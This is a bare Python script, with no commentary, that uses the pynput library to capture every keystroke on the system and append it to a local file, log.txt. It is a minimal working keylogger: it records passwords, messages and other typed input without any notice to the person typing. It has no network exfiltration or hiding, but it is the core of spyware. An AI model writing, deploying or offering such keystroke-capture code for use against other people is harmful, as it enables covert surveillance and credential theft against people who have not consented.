from pynput.keyboard import Key, Listener

def on_press(key):
    with open('log.txt', 'a') as f:
        f.write('{}\n'.format(key))

with Listener(on_press=on_press) as listener:
    listener.join()
